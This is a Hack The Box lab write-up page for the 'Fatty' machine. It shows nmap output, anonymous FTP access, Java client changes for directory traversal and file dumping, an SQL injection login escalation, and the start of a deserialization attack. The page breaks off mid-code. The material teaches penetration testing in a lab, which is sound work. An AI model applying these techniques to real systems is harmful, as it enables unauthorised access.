@@ -1,0 +1,684 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="Box enumeration  Ports opened:  nmap -sC -sV -A -T5 -Pn -oN nmap 10.10.10.174 Nmap 7.80 scan initiated Sat Feb 8 20:06:13 2020 as: nmap -sC -sV -A -T5 -Pn -oN nmap 10.10.10.174 Warning: 10.10.10.174 giving up on port because retransmission cap hit (2). Nmap scan report for 10.10.10.174 Host is up (0.050s latency). Not shown: 990 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.0.8 or later | ftp-anon: Anonymous FTP login allowed (FTP code 230) | -rw-r--r-- 1 ftp ftp 15426727 Oct 30 12:10 fatty-client." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="http://foxmaccloud.com/writeups/hackthebox/fatty/" />
+
+
+    <title>
+        
+            Fatty - Hack The Box :: FoxCorp  — Welcome to FoxCorp!
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.d1ea4af8fd04fb24a4f8b882ea54bd04eb245427ca4baf527c81a5dab071410b.css">
+
+
+
+
+
+
+<meta itemprop="name" content="Fatty - Hack The Box">
+<meta itemprop="description" content="Box enumeration  Ports opened:  nmap -sC -sV -A -T5 -Pn -oN nmap 10.10.10.174 Nmap 7.80 scan initiated Sat Feb 8 20:06:13 2020 as: nmap -sC -sV -A -T5 -Pn -oN nmap 10.10.10.174 Warning: 10.10.10.174 giving up on port because retransmission cap hit (2). Nmap scan report for 10.10.10.174 Host is up (0.050s latency). Not shown: 990 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.0.8 or later | ftp-anon: Anonymous FTP login allowed (FTP code 230) | -rw-r--r-- 1 ftp ftp 15426727 Oct 30 12:10 fatty-client.">
+<meta itemprop="datePublished" content="2020-05-06T01:03:36+02:00" />
+<meta itemprop="dateModified" content="2020-05-06T01:03:36+02:00" />
+<meta itemprop="wordCount" content="2117">
+<meta itemprop="image" content="http://foxmaccloud.com/"/>
+
+
+
+<meta itemprop="keywords" content="" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="http://foxmaccloud.com/"/>
+
+<meta name="twitter:title" content="Fatty - Hack The Box"/>
+<meta name="twitter:description" content="Box enumeration  Ports opened:  nmap -sC -sV -A -T5 -Pn -oN nmap 10.10.10.174 Nmap 7.80 scan initiated Sat Feb 8 20:06:13 2020 as: nmap -sC -sV -A -T5 -Pn -oN nmap 10.10.10.174 Warning: 10.10.10.174 giving up on port because retransmission cap hit (2). Nmap scan report for 10.10.10.174 Host is up (0.050s latency). Not shown: 990 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.0.8 or later | ftp-anon: Anonymous FTP login allowed (FTP code 230) | -rw-r--r-- 1 ftp ftp 15426727 Oct 30 12:10 fatty-client."/>
+
+
+
+    <meta property="og:title" content="Fatty - Hack The Box" />
+<meta property="og:description" content="Box enumeration  Ports opened:  nmap -sC -sV -A -T5 -Pn -oN nmap 10.10.10.174 Nmap 7.80 scan initiated Sat Feb 8 20:06:13 2020 as: nmap -sC -sV -A -T5 -Pn -oN nmap 10.10.10.174 Warning: 10.10.10.174 giving up on port because retransmission cap hit (2). Nmap scan report for 10.10.10.174 Host is up (0.050s latency). Not shown: 990 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.0.8 or later | ftp-anon: Anonymous FTP login allowed (FTP code 230) | -rw-r--r-- 1 ftp ftp 15426727 Oct 30 12:10 fatty-client." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://foxmaccloud.com/writeups/hackthebox/fatty/" />
+<meta property="og:image" content="http://foxmaccloud.com/"/>
+<meta property="article:published_time" content="2020-05-06T01:03:36+02:00" />
+<meta property="article:modified_time" content="2020-05-06T01:03:36+02:00" /><meta property="og:site_name" content="FoxCorp" />
+
+
+
+
+
+
+    <meta property="article:published_time" content="2020-05-06 01:03:36 &#43;0200 CEST" />
+
+
+
+
+
+
+
+
+    </head>
+
+    <body class="dark-theme">
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">$ cd /home/</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="http://foxmaccloud.com/posts/">Posts</a></li><li><a href="http://foxmaccloud.com/whoami/">whoami</a></li><li><a href="http://foxmaccloud.com/writeups/">Writeups</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+
+            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+</span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            <h2 class="post-title"><a href="http://foxmaccloud.com/writeups/hackthebox/fatty/">Fatty - Hack The Box</a></h2>
+
+            
+
+            <div class="post-content">
+                <h1 id="box-enumeration">Box enumeration</h1>
+<ol>
+<li>Ports opened:</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nmap -sC -sV -A -T5 -Pn -oN nmap 10.10.10.174
+Nmap 7.80 scan initiated Sat Feb  <span style="color:#ae81ff">8</span> 20:06:13 <span style="color:#ae81ff">2020</span> as: nmap -sC -sV -A -T5 -Pn -oN nmap 10.10.10.174
+Warning: 10.10.10.174 giving up on port because retransmission cap hit <span style="color:#f92672">(</span>2<span style="color:#f92672">)</span>.
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.174
+Host is up <span style="color:#f92672">(</span>0.050s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">990</span> closed ports
+PORT     STATE    SERVICE         VERSION
+21/tcp   open     ftp             vsftpd 2.0.8 or later
+| ftp-anon: Anonymous FTP login allowed <span style="color:#f92672">(</span>FTP code 230<span style="color:#f92672">)</span>
+| -rw-r--r--    <span style="color:#ae81ff">1</span> ftp      ftp      <span style="color:#ae81ff">15426727</span> Oct <span style="color:#ae81ff">30</span> 12:10 fatty-client.jar
+| -rw-r--r--    <span style="color:#ae81ff">1</span> ftp      ftp           <span style="color:#ae81ff">526</span> Oct <span style="color:#ae81ff">30</span> 12:10 note.txt
+| -rw-r--r--    <span style="color:#ae81ff">1</span> ftp      ftp           <span style="color:#ae81ff">426</span> Oct <span style="color:#ae81ff">30</span> 12:10 note2.txt
+|_-rw-r--r--    <span style="color:#ae81ff">1</span> ftp      ftp           <span style="color:#ae81ff">194</span> Oct <span style="color:#ae81ff">30</span> 12:10 note3.txt
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|      Connected to 10.10.14.26
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is <span style="color:#ae81ff">300</span>
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was <span style="color:#ae81ff">3</span>
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp   open     ssh             OpenSSH 7.4p1 Debian 10+deb9u7 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+| ssh-hostkey:
+|   <span style="color:#ae81ff">2048</span> fd:c5:61:ba:bd:a3:e2:26:58:20:45:69:a7:58:35:08 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+|_  <span style="color:#ae81ff">256</span> 4a:a8:aa:c6:5f:10:f0:71:8a:59:c5:3e:5f:b9:32:f7 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+280/tcp  filtered http-mgmt
+667/tcp  filtered disclose
+1086/tcp filtered cplscrambler-lg
+1166/tcp filtered qsm-remote
+3784/tcp filtered bfd-control
+8031/tcp filtered unknown
+8994/tcp filtered unknown
+9998/tcp filtered distinct32
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+<span style="color:#75715e"># Nmap done at Sat Feb  8 20:06:33 2020 -- 1 IP address (1 host up) scanned in 19.67 seconds</span>
+</code></pre></div><ol start="2">
+<li>FTP has anonymous access:</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ftp 10.10.10.174
+Connected to 10.10.10.174.
+<span style="color:#ae81ff">220</span> qtc<span style="color:#960050;background-color:#1e0010">&#39;</span>s development server
+Name <span style="color:#f92672">(</span>10.10.10.174:root<span style="color:#f92672">)</span>: ftp
+<span style="color:#ae81ff">230</span> Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls
+<span style="color:#ae81ff">200</span> PORT command successful. Consider using PASV.
+<span style="color:#ae81ff">150</span> Here comes the directory listing.
+-rw-r--r--    <span style="color:#ae81ff">1</span> ftp      ftp      <span style="color:#ae81ff">15426727</span> Oct <span style="color:#ae81ff">30</span> 12:10 fatty-client.jar
+-rw-r--r--    <span style="color:#ae81ff">1</span> ftp      ftp           <span style="color:#ae81ff">526</span> Oct <span style="color:#ae81ff">30</span> 12:10 note.txt
+-rw-r--r--    <span style="color:#ae81ff">1</span> ftp      ftp           <span style="color:#ae81ff">426</span> Oct <span style="color:#ae81ff">30</span> 12:10 note2.txt
+-rw-r--r--    <span style="color:#ae81ff">1</span> ftp      ftp           <span style="color:#ae81ff">194</span> Oct <span style="color:#ae81ff">30</span> 12:10 note3.txt
+<span style="color:#ae81ff">226</span> Directory send OK.
+ftp&gt;
+</code></pre></div><ol start="3">
+<li>From notes we can get information about high ports that are used for <code>fatty-client.jar</code>.</li>
+</ol>
+<h1 id="modifying-the-java-client">Modifying the Java client</h1>
+<ol>
+<li>
+<p>Edit <code>bean.xml</code> and replace port 8080 with one from high ports discovered.</p>
+</li>
+<li>
+<p>To fix issue with signature changed remove the signature files completely:</p>
+</li>
+</ol>
+<ul>
+<li>1.RSA</li>
+<li>1.SF</li>
+</ul>
+<ol start="3">
+<li>
+<p>Add <code>server.fatty.htb</code> to <code>/etc/hosts</code> and you should be able to connect with <code>qtc</code> credentials.</p>
+</li>
+<li>
+<p>Client is very limited and only shows some mail, notes, and few configuration files. All of them in some chrooted environment with no option to get to upper folders.</p>
+</li>
+<li>
+<p>After examining client code it&rsquo;s obvious that all mail, file, etc menu option uses predefined currentFolder. We may either modify any existing (simple) or add custom menu to get upper folder content:</p>
+</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">	<span style="color:#66d9ef">public</span> <span style="color:#a6e22e">ClientGuiTest</span><span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+		<span style="color:#f92672">...</span>
+		<span style="color:#75715e">// Create a new menu
+</span><span style="color:#75715e"></span>		<span style="color:#66d9ef">final</span> JMenuItem upperFolder <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> JMenuItem<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;upperFolder&#34;</span><span style="color:#f92672">);</span>
+		upperFolder<span style="color:#f92672">.</span><span style="color:#a6e22e">setEnabled</span><span style="color:#f92672">(</span><span style="color:#66d9ef">false</span><span style="color:#f92672">);</span>
+		fileBrowser<span style="color:#f92672">.</span><span style="color:#a6e22e">add</span><span style="color:#f92672">(</span>upperFolder<span style="color:#f92672">);</span>
+
+		<span style="color:#f92672">...</span>
+
+		btnNewButton<span style="color:#f92672">.</span><span style="color:#a6e22e">addActionListener</span><span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> ActionListener<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+	 		<span style="color:#f92672">...</span>
+		   	<span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>ClientGuiTest<span style="color:#f92672">.</span><span style="color:#a6e22e">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">conn</span><span style="color:#f92672">.</span><span style="color:#a6e22e">login</span><span style="color:#f92672">(</span>ClientGuiTest<span style="color:#f92672">.</span><span style="color:#a6e22e">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">user</span><span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
+		   		<span style="color:#f92672">...</span>
+		   		<span style="color:#75715e">// Enable a new menu
+</span><span style="color:#75715e"></span>		   		upperFolder<span style="color:#f92672">.</span><span style="color:#a6e22e">setEnabled</span><span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
+		   		<span style="color:#f92672">....</span>
+		   	<span style="color:#f92672">}</span>
+		<span style="color:#f92672">});</span>
+	   	<span style="color:#f92672">...</span>
+	   	<span style="color:#75715e">// Listener for new menu
+</span><span style="color:#75715e"></span>	    upperFolder<span style="color:#f92672">.</span><span style="color:#a6e22e">addActionListener</span><span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> ActionListener<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+	      <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">actionPerformed</span><span style="color:#f92672">(</span>ActionEvent e<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+	        String response <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">;</span>
+	        ClientGuiTest<span style="color:#f92672">.</span><span style="color:#a6e22e">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">currentFolder</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;..&#34;</span><span style="color:#f92672">;</span>
+	        <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
+	          response <span style="color:#f92672">=</span> ClientGuiTest<span style="color:#f92672">.</span><span style="color:#a6e22e">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">invoker</span><span style="color:#f92672">.</span><span style="color:#a6e22e">showFiles</span><span style="color:#f92672">(</span>ClientGuiTest<span style="color:#f92672">.</span><span style="color:#a6e22e">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">currentFolder</span><span style="color:#f92672">);</span>
+	        <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>MessageBuildException <span style="color:#f92672">|</span> htb<span style="color:#f92672">.</span><span style="color:#a6e22e">fatty</span><span style="color:#f92672">.</span><span style="color:#a6e22e">shared</span><span style="color:#f92672">.</span><span style="color:#a6e22e">message</span><span style="color:#f92672">.</span><span style="color:#a6e22e">MessageParseException</span> e1<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+	          JOptionPane<span style="color:#f92672">.</span><span style="color:#a6e22e">showMessageDialog</span><span style="color:#f92672">(</span>controlPanel<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;Failure during upperFolder building/parsing.&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;Error&#34;</span><span style="color:#f92672">,</span> 0<span style="color:#f92672">);</span>
+	        <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>IOException e2<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+	          JOptionPane<span style="color:#f92672">.</span><span style="color:#a6e22e">showMessageDialog</span><span style="color:#f92672">(</span>controlPanel<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;Unable to contact the server. If this problem remains, please close and reopen the client.&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;Error&#34;</span><span style="color:#f92672">,</span> 0<span style="color:#f92672">);</span>
+	        <span style="color:#f92672">}</span>
+	        textPane<span style="color:#f92672">.</span><span style="color:#a6e22e">setText</span><span style="color:#f92672">(</span>response<span style="color:#f92672">);</span>
+	      <span style="color:#f92672">}</span>
+	    <span style="color:#f92672">});</span>
+</code></pre></div><ol start="6">
+<li>That allowed us to discover following content:</li>
+</ol>
+<pre><code>logs
+tar
+start.sh
+fatty-server.jar
+files
+</code></pre><ol start="7">
+<li>We can read text files with client, but any binary file will make it die. Let&rsquo;s modify client once again to save all files to <code>/tmp/</code> instead of displaying it:</li>
+</ol>
+<ul>
+<li><code>Invoker.java</code>:</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> <span style="color:#a6e22e">open</span><span style="color:#f92672">(</span>String foldername<span style="color:#f92672">,</span> String filename<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> MessageParseException<span style="color:#f92672">,</span> MessageBuildException<span style="color:#f92672">,</span> IOException <span style="color:#f92672">{</span>
+    <span style="color:#f92672">...</span>
+    <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> response<span style="color:#f92672">;</span>
+    <span style="color:#f92672">...</span>
+  <span style="color:#f92672">}</span>
+</code></pre></div><ul>
+<li><code>ClientGuiTest.java</code>:</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">    openFileButton<span style="color:#f92672">.</span><span style="color:#a6e22e">addActionListener</span><span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> ActionListener<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+      <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">actionPerformed</span><span style="color:#f92672">(</span>ActionEvent e<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>ClientGuiTest<span style="color:#f92672">.</span><span style="color:#a6e22e">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">currentFolder</span> <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+          JOptionPane<span style="color:#f92672">.</span><span style="color:#a6e22e">showMessageDialog</span><span style="color:#f92672">(</span>controlPanel<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;No folder selected! List a directory first!&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;Error&#34;</span><span style="color:#f92672">,</span> 0<span style="color:#f92672">);</span>
+
+          <span style="color:#66d9ef">return</span><span style="color:#f92672">;</span>
+        <span style="color:#f92672">}</span>
+
+        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> response <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[</span>0<span style="color:#f92672">];</span>
+        String fileName <span style="color:#f92672">=</span> ClientGuiTest<span style="color:#f92672">.</span><span style="color:#a6e22e">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">fileTextField</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getText</span><span style="color:#f92672">();</span>
+        fileName<span style="color:#f92672">.</span><span style="color:#a6e22e">replaceAll</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;[^a-zA-Z0-9.]&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">);</span>
+        <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
+          response <span style="color:#f92672">=</span> ClientGuiTest<span style="color:#f92672">.</span><span style="color:#a6e22e">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">invoker</span><span style="color:#f92672">.</span><span style="color:#a6e22e">open</span><span style="color:#f92672">(</span>ClientGuiTest<span style="color:#f92672">.</span><span style="color:#a6e22e">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">currentFolder</span><span style="color:#f92672">,</span> fileName<span style="color:#f92672">);</span>
+
+          OutputStream outputStream <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> FileOutputStream<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/tmp/&#34;</span> <span style="color:#f92672">+</span> fileName<span style="color:#f92672">);</span>
+          outputStream<span style="color:#f92672">.</span><span style="color:#a6e22e">write</span><span style="color:#f92672">(</span>response<span style="color:#f92672">);</span>
+          outputStream<span style="color:#f92672">.</span><span style="color:#a6e22e">close</span><span style="color:#f92672">();</span>
+        <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>MessageBuildException <span style="color:#f92672">|</span> htb<span style="color:#f92672">.</span><span style="color:#a6e22e">fatty</span><span style="color:#f92672">.</span><span style="color:#a6e22e">shared</span><span style="color:#f92672">.</span><span style="color:#a6e22e">message</span><span style="color:#f92672">.</span><span style="color:#a6e22e">MessageParseException</span> e1<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+          JOptionPane<span style="color:#f92672">.</span><span style="color:#a6e22e">showMessageDialog</span><span style="color:#f92672">(</span>controlPanel<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;Failure during message building/parsing.&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;Error&#34;</span><span style="color:#f92672">,</span> 0<span style="color:#f92672">);</span>
+        <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>IOException e2<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+          JOptionPane<span style="color:#f92672">.</span><span style="color:#a6e22e">showMessageDialog</span><span style="color:#f92672">(</span>controlPanel<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;Unable to contact the server. If this problem remains, please close and reopen the client.&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;Error&#34;</span><span style="color:#f92672">,</span> 0<span style="color:#f92672">);</span>
+        <span style="color:#f92672">}</span>
+
+        textPane<span style="color:#f92672">.</span><span style="color:#a6e22e">setText</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Wrote file content to /tmp/&#34;</span> <span style="color:#f92672">+</span> fileName<span style="color:#f92672">);</span>
+      <span style="color:#f92672">}</span>
+    <span style="color:#f92672">});</span>
+</code></pre></div><ol start="8">
+<li>Downloaded <code>fatty-server.jar</code>.</li>
+</ol>
+<h1 id="fatty-server">fatty-server</h1>
+<ol>
+<li>In <code>FattyDBSession.java</code> we may notice insecure SQL execution:</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">  <span style="color:#66d9ef">public</span> User <span style="color:#a6e22e">checkLogin</span><span style="color:#f92672">(</span>User user<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> FattyDbSession<span style="color:#f92672">.</span><span style="color:#a6e22e">LoginException</span> <span style="color:#f92672">{</span>
+    Statement stmt <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">;</span>
+    ResultSet rs <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">;</span>
+    User newUser <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">;</span>
+
+    <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
+      stmt <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">conn</span><span style="color:#f92672">.</span><span style="color:#a6e22e">createStatement</span><span style="color:#f92672">();</span>
+      rs <span style="color:#f92672">=</span> stmt<span style="color:#f92672">.</span><span style="color:#a6e22e">executeQuery</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;SELECT id,username,email,password,role FROM users WHERE username=&#39;&#34;</span> <span style="color:#f92672">+</span> user<span style="color:#f92672">.</span><span style="color:#a6e22e">getUsername</span><span style="color:#f92672">()</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39;&#34;</span><span style="color:#f92672">);</span>
+</code></pre></div><ol start="2">
+<li>
+<p>We have control on supplied username we can trigger SQLi to escalate <code>qtc</code> to have admin privileges.</p>
+</li>
+<li>
+<p>However this will fail with <code>bad credentials</code> error. Let&rsquo;s review Java client again.</p>
+</li>
+<li>
+<p>In <code>User.java</code> we found that username is not plaintext:</p>
+</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">String hashString <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">username</span> <span style="color:#f92672">+</span> password <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;clarabibimakeseverythingsecure&#34;</span><span style="color:#f92672">;</span>
+</code></pre></div><ol start="5">
+<li>
+<p>Is it a hash of username and a password. The hash won&rsquo;t match on a server because we are sending SQLi string instead of username.</p>
+</li>
+<li>
+<p>Update <code>User.java</code> to hardcoded <code>qtc</code> in username and try again:</p>
+</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">String hashString <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;qtc&#34;</span> <span style="color:#f92672">+</span> password <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;clarabibimakeseverythingsecure&#34;</span><span style="color:#f92672">;</span>
+</code></pre></div><ol start="7">
+<li>
+<p>And we are admin now!</p>
+</li>
+<li>
+<p>Back to client/server code and one may notice that <code>User</code> class is Serializable and uses that during password change:</p>
+</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> String <span style="color:#a6e22e">changePW</span><span style="color:#f92672">(</span>ArrayList<span style="color:#f92672">&lt;</span>String<span style="color:#f92672">&gt;</span> args<span style="color:#f92672">,</span> User user<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+    logger<span style="color:#f92672">.</span><span style="color:#a6e22e">logInfo</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;[+] Method &#39;changePW&#39; was called.&#34;</span><span style="color:#f92672">);</span>
+    <span style="color:#66d9ef">int</span> methodID <span style="color:#f92672">=</span> 7<span style="color:#f92672">;</span>
+    <span style="color:#66d9ef">if</span> <span style="color:#f92672">(!</span>user<span style="color:#f92672">.</span><span style="color:#a6e22e">getRole</span><span style="color:#f92672">().</span><span style="color:#a6e22e">isAllowed</span><span style="color:#f92672">(</span>methodID<span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
+      logger<span style="color:#f92672">.</span><span style="color:#a6e22e">logError</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;[+] Access denied. Method with id &#39;&#34;</span> <span style="color:#f92672">+</span> methodID <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39; was called by user &#39;&#34;</span> <span style="color:#f92672">+</span> user<span style="color:#f92672">.</span><span style="color:#a6e22e">getUsername</span><span style="color:#f92672">()</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39; with role &#39;&#34;</span> <span style="color:#f92672">+</span> user<span style="color:#f92672">.</span><span style="color:#a6e22e">getRoleName</span><span style="color:#f92672">()</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39;.&#34;</span><span style="color:#f92672">);</span>
+      <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Error: Method &#39;changePW&#39; is not allowed for this user account&#34;</span><span style="color:#f92672">;</span>
+    <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#f92672">{</span>
+      String response <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">;</span>
+      String b64User <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>String<span style="color:#f92672">)</span>args<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span>0<span style="color:#f92672">);</span>
+      <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> serializedUser <span style="color:#f92672">=</span> Base64<span style="color:#f92672">.</span><span style="color:#a6e22e">getDecoder</span><span style="color:#f92672">().</span><span style="color:#a6e22e">decode</span><span style="color:#f92672">(</span>b64User<span style="color:#f92672">.</span><span style="color:#a6e22e">getBytes</span><span style="color:#f92672">());</span>
+      ByteArrayInputStream bIn <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ByteArrayInputStream<span style="color:#f92672">(</span>serializedUser<span style="color:#f92672">);</span>
+
+      <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
